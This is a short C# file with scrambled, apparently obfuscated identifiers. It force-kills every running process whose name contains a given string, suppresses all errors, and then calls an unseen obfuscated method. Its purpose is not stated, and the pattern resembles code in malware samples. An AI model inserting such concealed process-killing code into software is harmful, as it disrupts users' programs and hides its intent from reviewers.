using System;
using System.Diagnostics;

namespace WvdSzXINIqX;

public sealed class PukESMjiOkphp
{
	public static bool RGLzGsyGHf(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void OPjWTgjUmjZopfx(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (RGLzGsyGHf(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					JenwHsdeeXa.mWgakOzIXDFLwyIcHK();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
